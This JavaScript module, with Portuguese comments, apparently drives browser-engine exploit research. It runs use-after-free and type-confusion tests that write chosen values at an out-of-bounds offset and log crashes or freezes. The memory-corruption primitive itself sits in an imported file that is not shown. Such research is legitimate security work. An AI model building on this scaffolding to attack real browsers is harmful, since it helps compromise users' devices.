// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// A função detailed_toJSON_Inquisitive_WithDepthControl está agora em testJsonTypeConfusionUAFSpeculative.mjs
// e é usada por executeUAFTypeConfusionTestWithValue.
import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG, KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Adicionado KNOWN_STRUCTURE_IDS
import { toHex } from '../utils.mjs';


async function runUAFTypeConfusionValueTests_WithInquisitiveToJSON() { // Nome atualizado
    const FNAME_RUNNER = "runUAFTypeConfusionValueTests_WithInquisitiveToJSON";
    logS3(`==== INICIANDO Testes UAF/TC com Valores Variados em 0x70 (toJSON Inquisitiva) ====`, 'test', FNAME_RUNNER);

    // const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70 // Usado implicitamente por executeUAFTypeConfusionTestWithValue

    const valuesToInvestigate = [
        { desc: "Val_0000", val: 0x00000000 },
        { desc: "Val_0001", val: 0x00000001 },
        { desc: "Val_AAAA", val: 0x41414141 }, // Padrão
        // Tentar um StructureID conhecido (se preenchido e numérico em config.mjs)
        // { desc: "Val_StructID_AB", val: parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16) || 0xDEADBEEF }, // Exemplo
        // Testar o 0xFFFFFFFF por último, pois ele causou o TypeError antes
        { desc: "Val_FFFF", val: 0xFFFFFFFF }, 
    ];

    for (const valueTest of valuesToInvestigate) {
        const testDescription = `UAFTC_InquisV_${valueTest.desc}_Offset0x70`;
        logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
        
        let result = await executeUAFTypeConfusionTestWithValue(
            testDescription,
            valueTest.val
        );

        if (result.potentiallyFroze) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
    }

    logS3(`==== Testes UAF/TC com Valores Variados (toJSON Inquisitiva) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UAFTC_InquisitiveValueTests'; // Nome atualizado
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Testes UAF/TC com Valores Variados e toJSON Inquisitiva ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - UAF/TC Valores Variados Inquisitiva";
    
    await runUAFTypeConfusionValueTests_WithInquisitiveToJSON(); // Nome da função atualizado
    
    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC com Valores Variados e toJSON Inquisitiva) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
